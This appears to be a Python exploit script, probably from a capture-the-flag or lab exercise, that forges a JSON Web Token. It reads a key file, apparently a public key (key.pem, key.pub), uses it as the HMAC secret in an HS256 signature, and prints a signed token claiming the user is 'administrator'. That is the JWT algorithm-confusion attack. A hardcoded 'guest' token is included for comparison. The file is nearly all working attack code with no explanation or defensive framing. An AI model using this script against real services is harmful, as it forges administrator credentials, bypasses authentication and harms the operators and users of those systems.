import hmac
import hashlib
import base64

#Paste the file with the key 

def genZ(file):
	key = file.read()

	#Paste your header and payload here
	header = '{"typ":"JWT","alg":"HS256"}'
	payload = '{"user":"administrator"}'

	#Creating encoded header
	encodedHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
	encodedHeader = str(encodedHBytes, "utf-8").rstrip("=")

	#Creating encoded payload
	encodedPBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
	encodedPayload = str(encodedPBytes, "utf-8").rstrip("=")

	#Concatenating header and payload
	token = (encodedHeader + "." + encodedPayload)

	#print(token)
	#print('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ')

	#token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ'

	#Creating signature
	sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

	print(token + "." + sig)


file = open('key.pem')
genZ(file)

# file = open('gen_token/key.pem')
# genZ(file)

# file = open('tmp/key.pub')
# genZ(file)

#print('--')
print('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.i7vSeqm0eeDxbgdfE5T4If526k9lxHmmG24IWcY6qG0')
